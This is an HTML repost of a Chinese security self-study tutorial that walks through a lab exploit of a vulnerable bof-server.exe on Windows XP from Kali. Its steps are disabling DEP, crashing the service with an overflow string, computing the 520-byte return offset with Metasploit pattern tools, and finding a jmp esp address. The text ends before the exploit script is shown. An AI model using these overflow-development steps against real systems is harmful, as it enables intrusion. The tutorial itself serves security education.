@@ -1,0 +1,926 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>网络安全自学篇五十三Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell | 开发者问答集锦</title>
+    <meta property="og:title" content="网络安全自学篇五十三Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="网络安全自学篇五十三Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%87%AA%E5%AD%A6%E7%AF%87%E4%BA%94%E5%8D%81%E4%B8%89windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bmetasploit%E5%AE%9E%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%8F%8A%E5%8F%8D%E5%BC%B9shell/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">网络安全自学篇五十三Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<p>这是作者的网络安全自学教程系列，主要是关于安全工具和实践操作的在线笔记，特分享出来与博友们学习，希望您们喜欢，一起进步。前文分享了虚拟机基础知识，包括XP操作系统安装、文件共享设置、网络快照及网络设置等。这篇文章将讲解了如果搭建XP和Kali环境，并通过Windows漏洞实现栈溢出攻击，通过Metasploit反弹shell，从而Kali系统获取了XP系统的shell。该栈溢出的具体流程包括：</p>
+
+<ul>
+<li>XP系统与Kali网络配置</li>
+<li>实现简单栈溢出实验，使用Msfconsole进入msf控制台</li>
+<li>任意非00的指令覆盖buffer和EBP</li>
+<li>从程序已经加载的dll中获取他们的jmp esp指令地址</li>
+<li>使用jmp esp的指令地址覆盖ReturnAddress</li>
+<li>从下一行开始填充Shellcode</li>
+<li>编写Ruby攻击脚本提权</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/26131d7e981741a9ac9ad675f1b0a5d5.jpg"><img src="https://img.it610.com/image/info8/26131d7e981741a9ac9ad675f1b0a5d5.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第1张图片" /></a></p>
+
+<p>作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，更希望您能与我一起操作和进步，后续将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！如果文章对您有帮助，将是我创作的最大动力，点赞、评论、私聊均可，一起加油喔~</p>
+
+<p>PS：本文参考了安全网站和参考文献中的文章（详见参考文献），并结合自己的经验和实践进行撰写，也推荐大家阅读参考文献。</p>
+
+<p>下载地址：<a href="https://github.com/eastmountyxz/NetworkSecuritySelf-study">https://github.com/eastmountyxz/NetworkSecuritySelf-study</a><br />
+工具地址：<a href="https://github.com/eastmountyxz/Security-Software-Based">https://github.com/eastmountyxz/Security-Software-Based</a></p>
+
+<h3 id="文章目录">文章目录</h3>
+
+<ul>
+<li>一.XP系统与Kali网络配置</li>
+<li>二.简单栈溢出实验</li>
+<li>三.使用Msfconsole进入msf控制台</li>
+<li>四.分析bof-serve运行加载的DLL文件</li>
+<li>五.通过Metasploit查找JMP ESP指令的地址</li>
+<li>六.编写Ruby攻击脚本及反弹Shell</li>
+<li>七.总结</li>
+</ul>
+
+<blockquote>
+<p>声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。</p>
+</blockquote>
+
+<p><strong>前文学习：</strong><br />
+[网络安全自学篇] 一.入门笔记之看雪Web安全学习及异或解密示例<br />
+[网络安全自学篇] 二.Chrome浏览器保留密码功能渗透解析及登录加密入门笔记<br />
+[网络安全自学篇] 三.Burp Suite工具安装配置、Proxy基础用法及暴库示例<br />
+[网络安全自学篇] 四.实验吧CTF实战之WEB渗透和隐写术解密<br />
+[网络安全自学篇] 五.IDA Pro反汇编工具初识及逆向工程解密实战<br />
+[网络安全自学篇] 六.OllyDbg动态分析工具基础用法及Crakeme逆向<br />
+[网络安全自学篇] 七.快手视频下载之Chrome浏览器Network分析及Python爬虫探讨<br />
+[网络安全自学篇] 八.Web漏洞及端口扫描之Nmap、ThreatScan和DirBuster工具<br />
+[网络安全自学篇] 九.社会工程学之基础概念、IP获取、IP物理定位、文件属性<br />
+[网络安全自学篇] 十.论文之基于机器学习算法的主机恶意代码<br />
+[网络安全自学篇] 十一.虚拟机VMware+Kali安装入门及Sqlmap基本用法<br />
+[网络安全自学篇] 十二.Wireshark安装入门及抓取网站用户名密码（一）<br />
+[网络安全自学篇] 十三.Wireshark抓包原理（ARP劫持、MAC泛洪）及数据流追踪和图像抓取（二）<br />
+[网络安全自学篇] 十四.Python攻防之基础常识、正则表达式、Web编程和套接字通信（一）<br />
+[网络安全自学篇] 十五.Python攻防之多线程、C段扫描和数据库编程（二）<br />
+[网络安全自学篇] 十六.Python攻防之弱口令、自定义字典生成及网站暴库防护<br />
+[网络安全自学篇] 十七.Python攻防之构建Web目录扫描器及ip代理池（四）<br />
+[网络安全自学篇] 十八.XSS跨站脚本攻击原理及代码攻防演示（一）<br />
+[网络安全自学篇] 十九.Powershell基础入门及常见用法（一）<br />
+[网络安全自学篇] 二十.Powershell基础入门及常见用法（二）<br />
+[网络安全自学篇] 二十一.GeekPwn极客大赛之安全攻防技术总结及ShowTime<br />
+[网络安全自学篇] 二十二.Web渗透之网站信息、域名信息、端口信息、敏感信息及指纹信息收集<br />
+[网络安全自学篇] 二十三.基于机器学习的恶意请求识别及安全领域中的机器学习<br />
+[网络安全自学篇] 二十四.基于机器学习的恶意代码识别及人工智能中的恶意代码检测<br />
+[网络安全自学篇] 二十五.Web安全学习路线及木马、病毒和防御初探<br />
+[网络安全自学篇] 二十六.Shodan搜索引擎详解及Python命令行调用<br />
+[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）<br />
+[网络安全自学篇] 二十八.文件上传漏洞和Caidao入门及防御原理（一）<br />
+[网络安全自学篇] 二十九.文件上传漏洞和IIS6.0解析漏洞及防御原理（二）<br />
+[网络安全自学篇] 三十.文件上传漏洞、编辑器漏洞和IIS高版本漏洞及防御（三）<br />
+[网络安全自学篇] 三十一.文件上传漏洞之Upload-labs靶场及CTF题目01-10（四）<br />
+[网络安全自学篇] 三十二.文件上传漏洞之Upload-labs靶场及CTF题目11-20（五）<br />
+[网络安全自学篇] 三十三.文件上传漏洞之绕狗一句话原理和绕过安全狗（六）<br />
+[网络安全自学篇] 三十四.Windows系统漏洞之5次Shift漏洞启动计算机<br />
+[网络安全自学篇] 三十五.恶意代码攻击溯源及恶意样本分析<br />
+[网络安全自学篇] 三十六.WinRAR漏洞复现（CVE-2018-20250）及恶意软件自启动劫持<br />
+[网络安全自学篇] 三十七.Web渗透提高班之hack the box在线靶场注册及入门知识<br />
+[网络安全自学篇] 三十八.hack the box渗透之BurpSuite和Hydra密码爆破及Python加密Post请求（二）<br />
+[网络安全自学篇] 三十九.hack the box渗透之DirBuster扫描路径及Sqlmap高级注入用法（三）<br />
+[网络安全自学篇] 四十.phpMyAdmin 4.8.1后台文件包含漏洞复现及详解（CVE-2018-12613）<br />
+[网络安全自学篇] 四十一.中间人攻击和ARP欺骗原理详解及漏洞还原<br />
+[网络安全自学篇] 四十二.DNS欺骗和钓鱼网站原理详解及漏洞还原<br />
+[网络安全自学篇] 四十三.木马原理详解、远程服务器IPC$漏洞及木马植入实验<br />
+[网络安全自学篇] 四十四.Windows远程桌面服务漏洞（CVE-2019-0708）复现及详解<br />
+[网络安全自学篇] 四十五.病毒详解及批处理病毒制作（自启动、修改密码、定时关机、蓝屏、进程关闭）<br />
+[网络安全自学篇] 四十六.微软证书漏洞CVE-2020-0601 (上)Windows验证机制及可执行文件签名复现<br />
+[网络安全自学篇] 四十七.微软证书漏洞CVE-2020-0601 (下)Windows证书签名及HTTPS网站劫持<br />
+[网络安全自学篇] 四十八.Cracer第八期——(1)安全术语、Web渗透流程、Windows基础、注册表及黑客常用DOS命令<br />
+[网络安全自学篇] 四十九.Procmon软件基本用法及文件进程、注册表查看<br />
+[网络安全自学篇] 五十.虚拟机基础之安装XP系统、文件共享、网络快照设置及Wireshark抓取BBS密码<br />
+[网络安全自学篇] 五十.虚拟机基础之安装XP系统、文件共享、网络快照设置及Wireshark抓取BBS密码<br />
+[网络安全自学篇] 五十一.恶意样本分析及HGZ木马控制目标服务器<br />
+[网络安全自学篇] 五十二.Windows漏洞利用之栈溢出原理和栈保护GS机制</p>
+
+<p><strong>前文欣赏：</strong><br />
+[渗透&amp;攻防] 一.从数据库原理学习网络攻防及防止SQL注入<br />
+[渗透&amp;攻防] 二.SQL MAP工具从零解读数据库及基础用法<br />
+[渗透&amp;攻防] 三.数据库之差异备份及Caidao利器<br />
+[渗透&amp;攻防] 四.详解MySQL数据库攻防及Fiddler神器分析数据包</p>
+
+<hr />
+
+<h1 id="一-xp系统与kali网络配置">一.XP系统与Kali网络配置</h1>
+
+<p>本实验目的是Kali系统利用Windows XP栈溢出漏洞，以Metasploit溢出bof-
+server.exe为例，进行攻击及shell反弹。在进行所有实验之前，需要保证虚拟机各系统之间能够相互通信，安装过程详见之前的文章。</p>
+
+<p><strong>第一步，点击“虚拟机”- &gt;“设置”。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/5c44f15080144bed860d36cfe1a3067f.jpg"><img src="https://img.it610.com/image/info8/5c44f15080144bed860d36cfe1a3067f.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第2张图片" /></a></p>
+
+<p><strong>第二步，将XP和Kali网络连接属性均勾选成“NAT模式”，然后点击确定。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/f13e7bfb8de34cae90f0eaa39246e530.jpg"><img src="https://img.it610.com/image/info8/f13e7bfb8de34cae90f0eaa39246e530.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第3张图片" /></a></p>
+
+<p><strong>第三步，配置后在kali的shell上用ifconfig命令查看主机IP。</strong></p>
+
+<ul>
+<li>Kali：ifconfig 192.168.44.129</li>
+</ul>
+
+<p><img src="https://img.it610.com/image/info8/6b14587baa994a759f3d7fdff70f409e.jpg" alt="在这里插入图片描述" /></p>
+
+<p><a href="https://img.it610.com/image/info8/d162ebcceb9147fe80eb3a4a7097bcad.jpg"><img src="https://img.it610.com/image/info8/d162ebcceb9147fe80eb3a4a7097bcad.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第4张图片" /></a></p>
+
+<p><strong>第四步，在Windows的命令行中用ipconfig查看主机IP。</strong></p>
+
+<ul>
+<li>XP：ipconfig 192.168.44.130</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/510b549065fe4337a30fea5c6e889508.jpg"><img src="https://img.it610.com/image/info8/510b549065fe4337a30fea5c6e889508.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第5张图片" /></a></p>
+
+<p>同时，主机Win10系统也能够Ping通虚拟机和Kali系统。</p>
+
+<p><img src="https://img.it610.com/image/info8/f482a629018f4fc6ba954af3a01d4b57.jpg" alt="在这里插入图片描述" /></p>
+
+<p><a href="https://img.it610.com/image/info8/8b46beb1ad674d10a57fafed617f7d0e.jpg"><img src="https://img.it610.com/image/info8/8b46beb1ad674d10a57fafed617f7d0e.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第6张图片" /></a></p>
+
+<hr />
+
+<h1 id="二-简单栈溢出实验">二.简单栈溢出实验</h1>
+
+<p>bof-serve下载地址：<a href="https://github.com/eastmountyxz/Security-Software-Based">https://github.com/eastmountyxz/Security-Software-Based</a></p>
+
+<p><a href="https://img.it610.com/image/info8/10d1b6fa991043ef88f32411fa078bcc.jpg"><img src="https://img.it610.com/image/info8/10d1b6fa991043ef88f32411fa078bcc.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第7张图片" /></a></p>
+
+<p><strong>第一步，在主机Win10系统中设置共享文件夹，将bof-serve.exe共享给虚拟机中的XP系统。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/948ca8a8f526421fb3455581b73a5f40.jpg"><img src="https://img.it610.com/image/info8/948ca8a8f526421fb3455581b73a5f40.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第8张图片" /></a></p>
+
+<p><strong>第二步，在XP系统下载该软件至E盘，并在CMD中运行该软件。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/6bdcb8a91fea4d1abc253e6d77720d76.jpg"><img src="https://img.it610.com/image/info8/6bdcb8a91fea4d1abc253e6d77720d76.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第9张图片" /></a></p>
+
+<blockquote>
+<p>bof-server.exe 4242<br />
+ 此时XP系统为服务端，开启4242端口处于监听状态。</p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/59e74e62cd084e319997aafe704742a7.jpg"><img src="https://img.it610.com/image/info8/59e74e62cd084e319997aafe704742a7.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第10张图片" /></a></p>
+
+<p><strong>第三步，Windows XP SP3关闭堆栈执行保护（DEP）保护。</strong></p>
+
+<blockquote>
+<p>栈溢出保护</p>
+
+<p>它是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/decdf1bba4574617a4328ddcda7d0d27.jpg"><img src="https://img.it610.com/image/info8/decdf1bba4574617a4328ddcda7d0d27.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第11张图片" /></a></p>
+
+<p>右键“我的电脑”，点击“属性”，然后在“高级”中选择“启动和故障恢复设置”，如下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/8f038bb9b13e4cce8a778096f20ba63d.jpg"><img src="https://img.it610.com/image/info8/8f038bb9b13e4cce8a778096f20ba63d.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第12张图片" /></a></p>
+
+<p>节点点击“编辑”按钮，弹出boot.ini文件。</p>
+
+<p><a href="https://img.it610.com/image/info8/62dee84054d54c519ac7e41ef5c3ae04.jpg"><img src="https://img.it610.com/image/info8/62dee84054d54c519ac7e41ef5c3ae04.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第13张图片" /></a></p>
+
+<p>代码如下：</p>
+
+<pre><code>[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; 
+/noexecute=optin /fastdetect
+</code></pre>
+
+<p><strong>我们将“noexecute=optin”修改为“noexecute=AlwaysOff”，表示关闭DEP堆栈执行保护。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/34247a75bd5c4e5dbc4f789a7f47a30e.jpg"><img src="https://img.it610.com/image/info8/34247a75bd5c4e5dbc4f789a7f47a30e.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第14张图片" /></a></p>
+
+<p><strong>第四步，在Kali系统中设置远程连接。</strong></p>
+
+<pre><code>telnet 192.168.44.130 4242
+</code></pre>
+
+<p>此时远程连接成功，输入“version”可以看到XP系统中bof-server的版本信息。</p>
+
+<p><a href="https://img.it610.com/image/info8/bf0e372178534e9eaaf7332fb78d6b35.jpg"><img src="https://img.it610.com/image/info8/bf0e372178534e9eaaf7332fb78d6b35.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第15张图片" /></a></p>
+
+<p>同样，XP系统可以看到目标客户端Kali系统（192.168.44.129）已经连接。</p>
+
+<p><a href="https://img.it610.com/image/info8/a595921b575c4fba9af3647e423c037d.jpg"><img src="https://img.it610.com/image/info8/a595921b575c4fba9af3647e423c037d.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第16张图片" /></a></p>
+
+<p><strong>第五步，用python生成1024个A，并且发送这些字符串给XP系统。</strong></p>
+
+<pre><code>python -c &quot;print('A'*1024)&quot;
+</code></pre>
+
+<p>注意通过telnet连接XP系统，然后发送这1024个字符串。</p>
+
+<p><a href="https://img.it610.com/image/info8/8c49742cd3fc4d43b0a5d5af07dbace7.jpg"><img src="https://img.it610.com/image/info8/8c49742cd3fc4d43b0a5d5af07dbace7.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第17张图片" /></a></p>
+
+<p><strong>第六步，观察XP系统，会返现bof-server.exe产生崩溃。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/32ba3da8f5b142d29db7a8faf98350c9.jpg"><img src="https://img.it610.com/image/info8/32ba3da8f5b142d29db7a8faf98350c9.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第18张图片" /></a></p>
+
+<p><strong>第七步，检查错误原因发现偏移处是41414141，这正是A的ascii码，说明发生了溢出。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/d253fd9940f6492aa8b2262e742b89b6.jpg"><img src="https://img.it610.com/image/info8/d253fd9940f6492aa8b2262e742b89b6.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第19张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/d7069491e99243e7af158c9fb4f90644.jpg"><img src="https://img.it610.com/image/info8/d7069491e99243e7af158c9fb4f90644.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第20张图片" /></a></p>
+
+<hr />
+
+<h1 id="三-使用msfconsole进入msf控制台">三.使用Msfconsole进入msf控制台</h1>
+
+<p>Msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件、payload、利用模块、post模块等。Msfconsole还有第三方程序的接口，比如nmap、sqlmap等，可以直接在msfconsole里面使用。
+在启动MSF终端之后，可以首先输入help命令列出MSF终端所支持的命令列表，包括核心命令集和后端数据库命令集。对于其中的大部分命令，你可以输入help［COMMAND］，进一步查看该命令的使用帮助信息。</p>
+
+<p><strong>第一步，输入Msfconsole打开msf。</strong></p>
+
+<pre><code>msfconsole
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/2282491675614ee18c21c6b765355a3b.jpg"><img src="https://img.it610.com/image/info8/2282491675614ee18c21c6b765355a3b.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第21张图片" /></a></p>
+
+<p><strong>第二步，输入search ms08-067查找漏洞。大家简单了解其功能，后续会写一篇文章专门分享。</strong></p>
+
+<pre><code>search ms08-067
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/c9bf40a4eb2749a994816ff0271a3bc0.jpg"><img src="https://img.it610.com/image/info8/c9bf40a4eb2749a994816ff0271a3bc0.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第22张图片" /></a></p>
+
+<p><strong>第三步，使用Metasploit中的pattern_create.rb脚本生成字符序列。</strong></p>
+
+<p>首先我们查看以下pattern_create.rb脚本的帮助信息，在Kali命令行输入如下信息：</p>
+
+<pre><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
+Usage: msf-pattern_create [options]
+Example: msf-pattern_create -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+</code></pre>
+
+<p>在msf控制台中输入以下命令生成字符序列。</p>
+
+<blockquote>
+<p>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024</p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/07a1fd2f05c944f8aea52550865ad5b7.jpg"><img src="https://img.it610.com/image/info8/07a1fd2f05c944f8aea52550865ad5b7.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第23张图片" /></a></p>
+
+<p><strong>第四步，调用telnet远程连接XP系统，并将生成的内容复制发送。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/16ff0099bff54656a91181960ed07f87.jpg"><img src="https://img.it610.com/image/info8/16ff0099bff54656a91181960ed07f87.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第24张图片" /></a></p>
+
+<p><strong>第五步，确定溢出点位置。</strong><br />
+使用pattern_create.rb产生1024个有序的字符，用同样的方式发送到XP系统，发现Offset位置为“72413372”。</p>
+
+<p><a href="https://img.it610.com/image/info8/ad06a5869ce745219a2f459fbc57b73d.jpg"><img src="https://img.it610.com/image/info8/ad06a5869ce745219a2f459fbc57b73d.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第25张图片" /></a></p>
+
+<p>此时的偏移是“72413372”，也就是说可以利用这个偏移来定位Buf的长度。任意非00的指令覆盖buffer和EBP，其结构我们再观察一遍Payload结构，如下图所示。</p>
+
+<p><a href="https://img.it610.com/image/info8/f91831a3c53d43f6afafb897adfbf463.jpg"><img src="https://img.it610.com/image/info8/f91831a3c53d43f6afafb897adfbf463.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第26张图片" /></a></p>
+
+<p><strong>第六步，调用文件pattern_offset.rb计算偏移量，其offset准确字节数量为520。</strong></p>
+
+<blockquote>
+<p>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413372
+-l 1024</p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/1b3c3ec86be549e99fa3dd8fbe06c3f8.jpg"><img src="https://img.it610.com/image/info8/1b3c3ec86be549e99fa3dd8fbe06c3f8.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第27张图片" /></a></p>
+
+<p>这里我们用到的工具是Metasploit下的pattern_offset.rb，查看pattern_offset.rb脚本的帮助信息如下：</p>
+
+<pre><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h
+Usage: msf-pattern_offset [options]
+Example: msf-pattern_offset -q Aa3A
+[*] Exact match at offset 9
+
+Options:
+    -q, --query Aa0A                 Query to Locate
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+</code></pre>
+
+<p>其中参数“-q”是要查询的地址，参数“-l”是要查询的字符序列的长度。我们对应的地址为72413372，生成的字符序列的长度为1024，其命令为：</p>
+
+<pre><code>msf5 &gt; /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413372 -l 1024
+[*] Exact match at offset 520
+</code></pre>
+
+<p>最终得出结果为520。</p>
+
+<hr />
+
+<h1 id="四-分析bof-serve运行加载的dll文件">四.分析bof-serve运行加载的DLL文件</h1>
+
+<p>使用pattern_offset计算得到长度是第520位。接下来寻找一个jmp esp的地址，用Immunity Debugger调试工具打开bof-
+server查看其调用的dll文件，这里选取WS2_32.dll这个文件。</p>
+
+<p>下载地址或github：<a href="http://www.immunityinc.com/products/debugger/">http://www.immunityinc.com/products/debugger/</a></p>
+
+<p><strong>第一步，通过文件共享功能将Immunity Debugger软件分享给XP系统。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/2ee3c8e157564ec096c535edea7101f6.jpg"><img src="https://img.it610.com/image/info8/2ee3c8e157564ec096c535edea7101f6.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第28张图片" /></a></p>
+
+<p><strong>第二步，安装并打开Immunity Debugger软件，点击“File”- &gt;“Attach”，显示目标机上运行的所有进程。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/c1e68995b7be4fb0b80db5f1630c35fe.jpg"><img src="https://img.it610.com/image/info8/c1e68995b7be4fb0b80db5f1630c35fe.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第29张图片" /></a></p>
+
+<p><strong>第三步，运行XP系统的服务程序bof-server.exe，端口为4242，处于监听状态。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/8ec0347749dc4834a71dc50ba9e1fdae.jpg"><img src="https://img.it610.com/image/info8/8ec0347749dc4834a71dc50ba9e1fdae.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第30张图片" /></a></p>
+
+<p><strong>第四步，查看XP系统上的所有进程，找到名称为bof-server.exe的进程并查看。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/9c490c8fbade422b8c0f29d8c5801175.jpg"><img src="https://img.it610.com/image/info8/9c490c8fbade422b8c0f29d8c5801175.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第31张图片" /></a></p>
+
+<p><strong>第五步，选中bof-server.exe进程，单击右下角的Attach按钮。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/7ca2cef44d0243dda7c65a07322a8d8e.jpg"><img src="https://img.it610.com/image/info8/7ca2cef44d0243dda7c65a07322a8d8e.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第32张图片" /></a></p>
+
+<p>此时，显示bof-server.exe的运行信息如下：</p>
+
+<p><a href="https://img.it610.com/image/info8/1a22f4e645e340b2b572f0489fcd13ae.jpg"><img src="https://img.it610.com/image/info8/1a22f4e645e340b2b572f0489fcd13ae.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第33张图片" /></a></p>
+
+<p><strong>第六步，选择“View”- &gt;“Executable modules”菜单。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/c2bb4d7f8cee45059c2888ea0ad19889.png"><img src="https://img.it610.com/image/info8/c2bb4d7f8cee45059c2888ea0ad19889.png" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第34张图片" /></a></p>
+
+<p>点击后的效果如下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/cfb2b59adec04507aff0583d3275cc40.png"><img src="https://img.it610.com/image/info8/cfb2b59adec04507aff0583d3275cc40.png" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第35张图片" /></a></p>
+
+<p><strong>这里，就是bof-
+server.exe运行加载的所有DLL文件了。这里我们选择一个ws2_32.dll文件上传到Kali的root目录下。复制的方法包括：</strong></p>
+
+<ul>
+<li>文件共享</li>
+<li>百度网盘链接下载</li>
+<li>远程服务传送</li>
+</ul>
+
+<p>ws2_32.DLL复制到Kali的目录，如下图所示：</p>
+
